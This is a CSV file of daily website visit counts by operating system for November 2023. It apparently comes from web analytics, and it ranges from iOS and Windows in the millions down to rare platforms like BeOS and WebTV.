date,os,visits
2023-11-26,UNIX,47
2023-11-26,OpenBSD,44
2023-11-26,SymbianOS,26
2023-11-26,Windows Phone,22
2023-11-26,Xbox,21
2023-11-26,NetBSD,20
2023-11-26,Playstation Vita,9
2023-11-26,Unknown,9
2023-11-26,Sony,7
2023-11-26,Mac OS,6
2023-11-26,Nokia,5
2023-11-26,SunOS,5
2023-11-26,iPhone,5
2023-11-26,Bada,4
2023-11-26,PalmOS,3
2023-11-26,Nintendo Wii,2
2023-11-26,BeOS,1
2023-11-25,iOS,13040965
2023-11-25,Android,6816631
2023-11-25,Windows,4967675
2023-11-25,Macintosh,2539208
2023-11-25,Linux,852744
2023-11-25,Chrome OS,271050
2023-11-25,(not set),22654
2023-11-25,Tizen,823
2023-11-25,OS/2,587
2023-11-25,Fuchsia,505
2023-11-25,Firefox OS,414
2023-11-25,Playstation 4,332
2023-11-25,BlackBerry,121
2023-11-25,FreeBSD,62
2023-11-25,UNIX,48
2023-11-25,Samsung,46
2023-11-25,Windows Phone,31
2023-11-25,OpenBSD,27
2023-11-25,SymbianOS,23
2023-11-25,NetBSD,22
2023-11-25,Xbox,16
2023-11-25,Sony,11
2023-11-25,PalmOS,6
2023-11-25,SunOS,6
2023-11-25,Mac OS,5
2023-11-25,Playstation Vita,5
2023-11-25,iPhone,5
2023-11-25,Nintendo Wii,4
2023-11-25,IRIX,3
2023-11-25,Nokia,3
2023-11-25,LG,2
2023-11-25,BeOS,1
2023-11-25,Playstation Portable,1
2023-11-25,Solaris,1
2023-11-24,iOS,13953271
2023-11-24,Android,7273453
2023-11-24,Windows,6862704
2023-11-24,Macintosh,2724185
2023-11-24,Linux,892154
2023-11-24,Chrome OS,298538
2023-11-24,(not set),28173
2023-11-24,Tizen,924
2023-11-24,OS/2,590
2023-11-24,Fuchsia,497
2023-11-24,Firefox OS,448
2023-11-24,Playstation 4,369
2023-11-24,BlackBerry,111
2023-11-24,FreeBSD,83
2023-11-24,Samsung,47
2023-11-24,OpenBSD,36
2023-11-24,UNIX,26
2023-11-24,Windows Phone,26
2023-11-24,SymbianOS,20
2023-11-24,Xbox,19
2023-11-24,NetBSD,17
2023-11-24,Mac OS,10
2023-11-24,Playstation Vita,6
2023-11-24,SunOS,5
2023-11-24,Nokia,4
2023-11-24,PalmOS,4
2023-11-24,WebTV,4
2023-11-24,Sony,2
2023-11-24,macOS X,2
2023-11-24,Nokia/Monster_00WW/MNR:11/RP1A.201005.001/00WW_1_910:user/release-keys,1
2023-11-24,Playstation 3,1
2023-11-24,Unknown,1
2023-11-24,iPhone,1
2023-11-24,samsung/dm1qsqw/dm1q:13/TP1A.220624.014/S911USQU1AWGH:user/release-keys,1
2023-11-23,iOS,10261966
2023-11-23,Android,5904223
2023-11-23,Windows,4979504
2023-11-23,Macintosh,2073245
2023-11-23,Linux,958396
2023-11-23,Chrome OS,260846
2023-11-23,(not set),31144
2023-11-23,Tizen,858
2023-11-23,OS/2,492
2023-11-23,Fuchsia,454
2023-11-23,Firefox OS,361
2023-11-23,Playstation 4,354
2023-11-23,BlackBerry,106
2023-11-23,FreeBSD,97
2023-11-23,Samsung,43
2023-11-23,UNIX,37
2023-11-23,OpenBSD,27
2023-11-23,Windows Phone,24
2023-11-23,SymbianOS,19
2023-11-23,Xbox,18
2023-11-23,NetBSD,13
2023-11-23,Playstation Vita,9
2023-11-23,Sony,8
2023-11-23,Mac OS,4
2023-11-23,SunOS,4
2023-11-23,iPhone,4
2023-11-23,Nintendo Wii,3
2023-11-23,Nokia,2
2023-11-23,Unknown,2
2023-11-23,Fedora,1
2023-11-23,IRIX,1
2023-11-23,LG,1
2023-11-23,PalmOS,1
2023-11-23,Solaris,1
2023-11-22,iOS,14779729
2023-11-22,Windows,11001452
2023-11-22,Android,7966179
2023-11-22,Macintosh,3415038
2023-11-22,Linux,1066058
2023-11-22,Chrome OS,398670
2023-11-22,(not set),26754
2023-11-22,Tizen,962
2023-11-22,OS/2,566
2023-11-22,Fuchsia,538
2023-11-22,Firefox OS,377
2023-11-22,Playstation 4,352
2023-11-22,FreeBSD,112
2023-11-22,BlackBerry,110
2023-11-22,UNIX,59
2023-11-22,Samsung,55
2023-11-22,Xbox,40
2023-11-22,Windows Phone,32
2023-11-22,SymbianOS,25
2023-11-22,OpenBSD,22
2023-11-22,NetBSD,14
2023-11-22,Mac OS,11
2023-11-22,Playstation Vita,6
2023-11-22,Sony,6
2023-11-22,Nintendo Wii,5
2023-11-22,Nokia,5
2023-11-22,SunOS,4
2023-11-22,iPhone,3
2023-11-22,PalmOS,2
2023-11-22,Unknown,2
2023-11-22,BeOS,1
2023-11-22,Fedora,1
2023-11-22,MOT,1
2023-11-22,NTT DoCoMo,1
2023-11-22,lge/cv7as/cv7as:10/QKQ1.200308.002/202391619c522:user/release-keys,1
2023-11-21,iOS,16048362
2023-11-21,Windows,14169231
2023-11-21,Android,8379026
2023-11-21,Macintosh,4151471
2023-11-21,Linux,1189565
2023-11-21,Chrome OS,707210
2023-11-21,(not set),28889
2023-11-21,Tizen,986
2023-11-21,OS/2,719
2023-11-21,Fuchsia,592
2023-11-21,Firefox OS,494
2023-11-21,Playstation 4,406
2023-11-21,BlackBerry,124
2023-11-21,FreeBSD,113
2023-11-21,UNIX,38
2023-11-21,Samsung,36
2023-11-21,OpenBSD,31
2023-11-21,SymbianOS,21
2023-11-21,Windows Phone,20
2023-11-21,Xbox,19
2023-11-21,Mac OS,12
2023-11-21,NetBSD,9
2023-11-21,Sony,9
2023-11-21,Playstation Vita,7
2023-11-21,Nokia,5
2023-11-21,SunOS,5
2023-11-21,Unknown,5
2023-11-21,PalmOS,3
2023-11-21,iPhone,3
2023-11-21,NTT DoCoMo,2
2023-11-21,Solaris,2
2023-11-21,BeOS,1
2023-11-21,LG,1
2023-11-21,MOT,1
2023-11-21,macOS X,1
2023-11-20,iOS,17554026
2023-11-20,Windows,14421231
2023-11-20,Android,8654557
2023-11-20,Macintosh,4532428
2023-11-20,Linux,1062835
2023-11-20,Chrome OS,846923
2023-11-20,(not set),31838
2023-11-20,Tizen,976
2023-11-20,OS/2,717
2023-11-20,Fuchsia,603
2023-11-20,Firefox OS,495
2023-11-20,Playstation 4,404
2023-11-20,FreeBSD,136
2023-11-20,BlackBerry,129
2023-11-20,Samsung,49
2023-11-20,UNIX,48
2023-11-20,OpenBSD,41
2023-11-20,SymbianOS,23
2023-11-20,Windows Phone,20
2023-11-20,Xbox,18
2023-11-20,SunOS,15
2023-11-20,Mac OS,13
2023-11-20,NetBSD,12
2023-11-20,Nokia,7
2023-11-20,PalmOS,5
2023-11-20,Playstation Vita,5
2023-11-20,Sony,4
2023-11-20,Unknown,3
2023-11-20,iPhone,2
2023-11-20,BeOS,1
2023-11-20,MOT,1
2023-11-20,Playstation 3,1
2023-11-20,Solaris,1
2023-11-20,Vodafone,1
2023-11-19,iOS,11137694
2023-11-19,Android,6218273
2023-11-19,Windows,5328044
2023-11-19,Macintosh,2885468
2023-11-19,Linux,801893
2023-11-19,Chrome OS,336349
2023-11-19,(not set),20745
2023-11-19,Tizen,914
2023-11-19,Fuchsia,575
2023-11-19,OS/2,546
2023-11-19,Firefox OS,378
2023-11-19,Playstation 4,360
2023-11-19,FreeBSD,105
2023-11-19,BlackBerry,94
2023-11-19,Samsung,47
2023-11-19,OpenBSD,32
2023-11-19,SymbianOS,32
2023-11-19,UNIX,29
2023-11-19,Xbox,23
2023-11-19,Windows Phone,21
2023-11-19,Mac OS,19
2023-11-19,NetBSD,16
2023-11-19,Playstation Vita,11
2023-11-19,Nokia,7
2023-11-19,Sony,4
2023-11-19,SunOS,3
2023-11-19,Solaris,2
2023-11-19,BeOS,1
2023-11-19,MOT,1
2023-11-19,PalmOS,1
2023-11-19,Playstation Portable,1
2023-11-19,Unknown,1
2023-11-19,WebTV,1
2023-11-19,macOS X,1
2023-11-18,iOS,12769326
2023-11-18,Android,6739627
2023-11-18,Windows,5301597
2023-11-18,Macintosh,2672125
2023-11-18,Linux,855014
2023-11-18,Chrome OS,301300
2023-11-18,(not set),20911
2023-11-18,Tizen,1107
2023-11-18,OS/2,527
2023-11-18,Fuchsia,483
2023-11-18,Playstation 4,354
2023-11-18,Firefox OS,353
2023-11-18,FreeBSD,102
2023-11-18,BlackBerry,78
2023-11-18,Samsung,38
2023-11-18,UNIX,34
2023-11-18,OpenBSD,30
2023-11-18,Windows Phone,25
2023-11-18,SymbianOS,24
2023-11-18,Xbox,21
2023-11-18,NetBSD,18
2023-11-18,Mac OS,13
2023-11-18,Sony,7
2023-11-18,SunOS,6
2023-11-18,Unknown,5
2023-11-18,Playstation Vita,4
2023-11-18,Nokia,3
2023-11-18,iPhone,3
2023-11-18,PalmOS,2
2023-11-18,MOT,1
2023-11-18,NTT DoCoMo,1
2023-11-18,Nintendo Wii,1
2023-11-18,motorola/genevn_g/genevn:13/T1TGN33.60-55/ba972-f0e3a:user/release-keys,1
2023-11-17,iOS,15438836
2023-11-17,Windows,12252823
2023-11-17,Android,7815337
2023-11-17,Macintosh,4018188
2023-11-17,Linux,1008927
2023-11-17,Chrome OS,938605
2023-11-17,(not set),31118
2023-11-17,Tizen,1036
2023-11-17,OS/2,587
2023-11-17,Fuchsia,516
2023-11-17,Firefox OS,436
2023-11-17,Playstation 4,396
2023-11-17,FreeBSD,118
2023-11-17,BlackBerry,115
2023-11-17,Samsung,48
2023-11-17,UNIX,39
2023-11-17,OpenBSD,33
2023-11-17,Windows Phone,32
2023-11-17,Xbox,25
2023-11-17,Mac OS,20
2023-11-17,NetBSD,16
2023-11-17,SymbianOS,13
2023-11-17,SunOS,12
2023-11-17,Sony,8
2023-11-17,Unknown,8
2023-11-17,Playstation Vita,7
2023-11-17,Nokia,3
2023-11-17,iPhone,3
2023-11-17,PalmOS,2
2023-11-17,macOS X,2
2023-11-17,BeOS,1
2023-11-17,LG,1
2023-11-17,Nintendo Wii,1
2023-11-16,iOS,16619714
2023-11-16,Windows,14800127
2023-11-16,Android,8336425
2023-11-16,Macintosh,4472428
2023-11-16,Chrome OS,1196845
2023-11-16,Linux,1064880
2023-11-16,(not set),40595
2023-11-16,Tizen,1116
2023-11-16,OS/2,606
2023-11-16,Fuchsia,583
2023-11-16,Firefox OS,437
2023-11-16,Playstation 4,398
2023-11-16,FreeBSD,113
2023-11-16,BlackBerry,108
2023-11-16,Samsung,41
2023-11-16,UNIX,38
2023-11-16,Windows Phone,29
2023-11-16,SymbianOS,24
2023-11-16,OpenBSD,20
2023-11-16,Xbox,20
2023-11-16,NetBSD,15
2023-11-16,Mac OS,13
2023-11-16,SunOS,12
2023-11-16,Unknown,10
2023-11-16,Playstation Vita,7
2023-11-16,Sony,7
2023-11-16,Nokia,4
2023-11-16,LG,3
2023-11-16,WebTV,2
2023-11-16,iPhone,1
2023-11-16,macOS X,1
2023-11-15,iOS,16365156
2023-11-15,Windows,15156712
2023-11-15,Android,8261606
2023-11-15,Macintosh,4638224
2023-11-15,Chrome OS,1165505
2023-11-15,Linux,1046183
2023-11-15,(not set),46987
2023-11-15,Tizen,1114
2023-11-15,OS/2,681
2023-11-15,Fuchsia,600
2023-11-15,Firefox OS,388
2023-11-15,Playstation 4,375
2023-11-15,BlackBerry,136
2023-11-15,FreeBSD,124
2023-11-15,UNIX,71
2023-11-15,OpenBSD,45
2023-11-15,Samsung,39
2023-11-15,Windows Phone,29
2023-11-15,Xbox,29
2023-11-15,NetBSD,19
2023-11-15,SunOS,14
2023-11-15,Unknown,14
2023-11-15,SymbianOS,8
2023-11-15,Mac OS,7
2023-11-15,WebTV,6
2023-11-15,Sony,5
2023-11-15,Playstation Vita,4
2023-11-15,iPhone,4
2023-11-15,PalmOS,3
2023-11-15,Nokia,2
2023-11-15,IRIX,1
2023-11-15,NTT DoCoMo,1
2023-11-15,Playstation 3,1
2023-11-15,Solaris,1
2023-11-14,iOS,15515933
2023-11-14,Windows,15129838
2023-11-14,Android,8060214
2023-11-14,Macintosh,4625585
2023-11-14,Chrome OS,1210479
2023-11-14,Linux,1100695
2023-11-14,(not set),33575
2023-11-14,Tizen,1100
2023-11-14,OS/2,589
2023-11-14,Fuchsia,564
2023-11-14,Firefox OS,420
2023-11-14,Playstation 4,365
2023-11-14,BlackBerry,127
2023-11-14,FreeBSD,104
2023-11-14,Samsung,56
2023-11-14,UNIX,35
2023-11-14,OpenBSD,32
2023-11-14,Windows Phone,23
2023-11-14,SymbianOS,17
2023-11-14,Xbox,17
2023-11-14,NetBSD,15
2023-11-14,Mac OS,10
2023-11-14,Sony,8
2023-11-14,Playstation Vita,5
2023-11-14,SunOS,5
2023-11-14,Nokia,4
2023-11-14,WebTV,3
2023-11-14,PalmOS,2
2023-11-14,macOS X,2
2023-11-14,NTT DoCoMo,1
2023-11-13,iOS,17432474
2023-11-13,Windows,15100731
2023-11-13,Android,8767297
2023-11-13,Macintosh,4913954
2023-11-13,Chrome OS,1169353
2023-11-13,Linux,1060924
2023-11-13,(not set),30098
2023-11-13,Tizen,1080
2023-11-13,Fuchsia,646
2023-11-13,OS/2,633
2023-11-13,Firefox OS,427
2023-11-13,Playstation 4,346
2023-11-13,BlackBerry,141
2023-11-13,FreeBSD,118
2023-11-13,UNIX,49
2023-11-13,OpenBSD,43
2023-11-13,Samsung,37
2023-11-13,Windows Phone,20
2023-11-13,SymbianOS,15
2023-11-13,Xbox,14
2023-11-13,NetBSD,13
2023-11-13,Sony,9
2023-11-13,Mac OS,8
2023-11-13,PalmOS,6
2023-11-13,Playstation Vita,6
2023-11-13,SunOS,4
2023-11-13,Nokia,3
2023-11-13,macOS X,3
2023-11-13,Playstation 3,2
2023-11-13,BeOS,1
2023-11-13,IRIX,1
2023-11-13,LG,1
2023-11-13,NTT DoCoMo,1
2023-11-13,Nintendo WiiU,1
2023-11-13,Unknown,1
2023-11-13,WebTV,1
2023-11-13,iPhone,1
2023-11-12,iOS,11077100
2023-11-12,Android,5878486
2023-11-12,Windows,5312373
2023-11-12,Macintosh,2849761
2023-11-12,Linux,843191
2023-11-12,Chrome OS,360159
2023-11-12,(not set),31422
2023-11-12,Tizen,1006
2023-11-12,Fuchsia,584
2023-11-12,OS/2,516
2023-11-12,Firefox OS,378
2023-11-12,Playstation 4,315
2023-11-12,BlackBerry,105
2023-11-12,FreeBSD,69
2023-11-12,OpenBSD,49
2023-11-12,Samsung,44
2023-11-12,UNIX,32
2023-11-12,Windows Phone,29
2023-11-12,Xbox,29
2023-11-12,SymbianOS,22
2023-11-12,Mac OS,21
2023-11-12,NetBSD,13
2023-11-12,Sony,10
2023-11-12,SunOS,6
2023-11-12,PalmOS,5
2023-11-12,Nokia,4
2023-11-12,MOT,2
2023-11-12,Playstation Vita,2
2023-11-12,Vodafone,1
2023-11-11,iOS,11412539
2023-11-11,Android,6348723
2023-11-11,Windows,4979598
2023-11-11,Macintosh,2407577
2023-11-11,Linux,862339
2023-11-11,Chrome OS,294516
2023-11-11,(not set),34900
2023-11-11,Tizen,1024
2023-11-11,OS/2,535
2023-11-11,Fuchsia,524
2023-11-11,Firefox OS,370
2023-11-11,Playstation 4,360
2023-11-11,BlackBerry,112
2023-11-11,FreeBSD,61
2023-11-11,Samsung,48
2023-11-11,Mac OS,43
2023-11-11,OpenBSD,32
2023-11-11,Windows Phone,25
2023-11-11,Xbox,20
2023-11-11,SymbianOS,18
2023-11-11,UNIX,15
2023-11-11,NetBSD,10
2023-11-11,Sony,6
2023-11-11,Nintendo Wii,5
2023-11-11,Playstation Vita,5
2023-11-11,SunOS,4
2023-11-11,PalmOS,3
2023-11-11,BeOS,2
2023-11-11,LG,1
2023-11-10,iOS,14542134
2023-11-10,Windows,10377427
2023-11-10,Android,7509655
2023-11-10,Macintosh,3625120
2023-11-10,Linux,993474
2023-11-10,Chrome OS,721940
2023-11-10,(not set),25915
2023-11-10,Tizen,1104
2023-11-10,OS/2,627
2023-11-10,Fuchsia,550
2023-11-10,Firefox OS,377
2023-11-10,Playstation 4,325
2023-11-10,BlackBerry,131
2023-11-10,FreeBSD,81
2023-11-10,Samsung,52
2023-11-10,OpenBSD,31
2023-11-10,Windows Phone,25
2023-11-10,UNIX,23
2023-11-10,NetBSD,22
2023-11-10,Mac OS,19
2023-11-10,SymbianOS,18
2023-11-10,SunOS,17
2023-11-10,Xbox,15
2023-11-10,Playstation Vita,5
2023-11-10,Nokia,4
2023-11-10,PalmOS,4
2023-11-10,Sony,3
2023-11-10,macOS X,3
2023-11-10,MOT,1
2023-11-10,NTT DoCoMo,1
2023-11-10,Solaris,1
2023-11-10,Unknown,1
2023-11-10,Vodafone,1
2023-11-10,iPhone,1
2023-11-09,iOS,15390447
2023-11-09,Windows,14802253
2023-11-09,Android,8196257
2023-11-09,Macintosh,4337623
2023-11-09,Chrome OS,1128252
2023-11-09,Linux,1043407
2023-11-09,(not set),29363
2023-11-09,Tizen,1165
2023-11-09,OS/2,646
2023-11-09,Fuchsia,642
2023-11-09,Firefox OS,438
2023-11-09,Playstation 4,318
2023-11-09,BlackBerry,144
2023-11-09,FreeBSD,78
2023-11-09,UNIX,71
2023-11-09,Samsung,53
2023-11-09,Windows Phone,27
2023-11-09,OpenBSD,26
2023-11-09,Xbox,26
2023-11-09,SymbianOS,15
2023-11-09,NetBSD,11
2023-11-09,notWindows,9
2023-11-09,SunOS,8
2023-11-09,Nokia,5
2023-11-09,Playstation Vita,5
2023-11-09,Mac OS,4
2023-11-09,Sony,4
2023-11-09,Nintendo Wii,2
2023-11-09,Unknown,2
2023-11-09,iPhone,2
2023-11-09,IRIX,1
2023-11-09,NTT DoCoMo,1
2023-11-09,PalmOS,1
2023-11-09,Solaris,1
2023-11-09,macOS X,1
2023-11-08,iOS,15541998
2023-11-08,Windows,15190932
2023-11-08,Android,8086192
2023-11-08,Macintosh,4581756
2023-11-08,Chrome OS,1218329
2023-11-08,Linux,1201390
2023-11-08,(not set),29218
2023-11-08,Tizen,1145
2023-11-08,OS/2,703
2023-11-08,Fuchsia,589
2023-11-08,Firefox OS,435
2023-11-08,FreeBSD,375
2023-11-08,Playstation 4,305
2023-11-08,UNIX,176
2023-11-08,BlackBerry,142
2023-11-08,Samsung,38
2023-11-08,Xbox,32
2023-11-08,Windows Phone,18
2023-11-08,OpenBSD,15
2023-11-08,NetBSD,13
2023-11-08,SymbianOS,10
2023-11-08,Mac OS,9
2023-11-08,Playstation Vita,7
2023-11-08,Nintendo Wii,5
2023-11-08,PalmOS,5
2023-11-08,Nokia,3
2023-11-08,SunOS,3
2023-11-08,LG,2
2023-11-08,NTT DoCoMo,2
2023-11-08,Sony,2
2023-11-08,Unknown,1
2023-11-08,iPhone,1
2023-11-08,macOS X,1
2023-11-07,Windows,15651323
2023-11-07,iOS,15366142
2023-11-07,Android,8325667
2023-11-07,Macintosh,4603980
2023-11-07,Linux,1172651
2023-11-07,Chrome OS,1034471
2023-11-07,(not set),32257
2023-11-07,FreeBSD,1716
2023-11-07,Tizen,1138
2023-11-07,Fuchsia,600
2023-11-07,OS/2,591
2023-11-07,Firefox OS,388
2023-11-07,Playstation 4,336
2023-11-07,BlackBerry,137
2023-11-07,Samsung,53
2023-11-07,UNIX,42
2023-11-07,Xbox,32
2023-11-07,Windows Phone,28
2023-11-07,Mac OS,21
2023-11-07,SymbianOS,20
2023-11-07,OpenBSD,14
2023-11-07,NetBSD,11
2023-11-07,SunOS,10
2023-11-07,Nintendo Wii,6
2023-11-07,Sony,5
2023-11-07,macOS X,4
2023-11-07,notWindows,4
2023-11-07,PalmOS,3
2023-11-07,Nokia,2
2023-11-07,Playstation Vita,2
2023-11-07,BeOS,1
2023-11-07,IRIX,1
2023-11-07,MOT,1
2023-11-06,iOS,16177383
2023-11-06,Windows,15486647
2023-11-06,Android,8390222
2023-11-06,Macintosh,4833518
2023-11-06,Linux,1136595
2023-11-06,Chrome OS,1064155
2023-11-06,(not set),25833
2023-11-06,FreeBSD,1373
2023-11-06,Tizen,1116
2023-11-06,OS/2,598
2023-11-06,Fuchsia,557
2023-11-06,Firefox OS,420
2023-11-06,Playstation 4,323
2023-11-06,BlackBerry,147
2023-11-06,Samsung,52
2023-11-06,UNIX,49
2023-11-06,Xbox,32
2023-11-06,Mac OS,29
2023-11-06,Windows Phone,28
2023-11-06,OpenBSD,24
2023-11-06,SymbianOS,18
2023-11-06,NetBSD,11
2023-11-06,Sony,9
2023-11-06,SunOS,8
2023-11-06,Nokia,5
2023-11-06,Nintendo Wii,3
2023-11-06,NTT DoCoMo,2
2023-11-06,Playstation 3,2
2023-11-06,Playstation Vita,2
2023-11-06,BeOS,1
2023-11-06,MOT,1
2023-11-06,PalmOS,1
2023-11-06,Solaris,1
2023-11-06,Vodafone,1
2023-11-05,iOS,10474380
2023-11-05,Android,6340223
2023-11-05,Windows,6069046
2023-11-05,Macintosh,3003533
2023-11-05,Linux,954751
2023-11-05,Chrome OS,355912
2023-11-05,(not set),21783
2023-11-05,Tizen,976
2023-11-05,FreeBSD,699
2023-11-05,Fuchsia,643
2023-11-05,OS/2,569
2023-11-05,Firefox OS,383
2023-11-05,Playstation 4,335
2023-11-05,BlackBerry,119
2023-11-05,Samsung,53
2023-11-05,Windows Phone,34
2023-11-05,UNIX,26
2023-11-05,Xbox,23
2023-11-05,Mac OS,21
2023-11-05,OpenBSD,16
2023-11-05,SymbianOS,16
2023-11-05,NetBSD,9
2023-11-05,Nokia,5
2023-11-05,Sony,5
2023-11-05,SunOS,5
2023-11-05,Playstation Vita,4
2023-11-05,iPhone,4
2023-11-05,PalmOS,3
2023-11-05,Solaris,2
2023-11-05,DingOS,1
2023-11-05,IRIX,1
2023-11-04,iOS,12345707
2023-11-04,Android,6518428
2023-11-04,Windows,5429753
2023-11-04,Macintosh,2496993
2023-11-04,Linux,949167
2023-11-04,Chrome OS,280719
2023-11-04,(not set),26909
2023-11-04,Tizen,991
2023-11-04,FreeBSD,791
2023-11-04,OS/2,551
2023-11-04,Fuchsia,478
2023-11-04,Firefox OS,364
2023-11-04,Playstation 4,313
2023-11-04,BlackBerry,112
2023-11-04,Windows Phone,57
2023-11-04,Samsung,46
2023-11-04,UNIX,39
2023-11-04,OpenBSD,32
2023-11-04,Xbox,26
2023-11-04,Mac OS,24
2023-11-04,SymbianOS,22
2023-11-04,NetBSD,8
2023-11-04,Sony,7
2023-11-04,SunOS,7
2023-11-04,Nokia,5
2023-11-04,Playstation Vita,5
2023-11-04,Nintendo Wii,4
2023-11-04,PalmOS,2
2023-11-04,LG,1
2023-11-04,MOT,1
2023-11-04,WebTV,1
2023-11-04,iPhone,1
2023-11-04,macOS X,1
2023-11-03,iOS,14216907
2023-11-03,Windows,12014106
2023-11-03,Android,7427170
2023-11-03,Macintosh,3743850
2023-11-03,Linux,1056869
2023-11-03,Chrome OS,927795
2023-11-03,(not set),26358
2023-11-03,FreeBSD,1312
2023-11-03,Tizen,1033
2023-11-03,OS/2,564
2023-11-03,Fuchsia,473
2023-11-03,Firefox OS,455
2023-11-03,Playstation 4,342
2023-11-03,BlackBerry,145
2023-11-03,Windows Phone,78
2023-11-03,Samsung,50
2023-11-03,Xbox,29
2023-11-03,Mac OS,28
2023-11-03,OpenBSD,21
2023-11-03,SymbianOS,19
2023-11-03,UNIX,19
2023-11-03,Sony,9
2023-11-03,SunOS,9
2023-11-03,NetBSD,7
2023-11-03,Nintendo Wii,4
2023-11-03,Nokia,4
2023-11-03,Playstation Vita,4
2023-11-03,PalmOS,3
2023-11-03,macOS X,3
2023-11-03,BeOS,1
2023-11-03,MOT,1
2023-11-03,NTT DoCoMo,1
2023-11-03,Playstation 3,1
2023-11-02,iOS,14561955
2023-11-02,Windows,14462103
2023-11-02,Android,7924184
2023-11-02,Macintosh,4381931
2023-11-02,Chrome OS,1143009
2023-11-02,Linux,1042559
2023-11-02,(not set),27129
2023-11-02,FreeBSD,1372
2023-11-02,Tizen,1066
2023-11-02,OS/2,564
2023-11-02,Fuchsia,526
2023-11-02,Firefox OS,457
2023-11-02,Playstation 4,296
2023-11-02,BlackBerry,135
2023-11-02,Windows Phone,86
2023-11-02,OpenBSD,55
2023-11-02,Samsung,44
2023-11-02,Xbox,36
2023-11-02,Mac OS,24
2023-11-02,UNIX,23
2023-11-02,SymbianOS,14
2023-11-02,Sony,11
2023-11-02,SunOS,9
2023-11-02,NetBSD,8
2023-11-02,Playstation Vita,5
2023-11-02,Nintendo 3DS,3
2023-11-02,Nokia,3
2023-11-02,PalmOS,3
2023-11-02,MOT,2
2023-11-02,BeOS,1
2023-11-02,Playstation 3,1
2023-11-02,Playstation Portable,1
2023-11-02,Solaris,1
2023-11-02,WebTV,1
2023-11-02,iPhone,1
2023-11-01,Windows,15458810
2023-11-01,iOS,14837630
2023-11-01,Android,7623462
2023-11-01,Macintosh,4443859
2023-11-01,Linux,1106397
2023-11-01,Chrome OS,1064523
2023-11-01,(not set),30309
2023-11-01,FreeBSD,1237
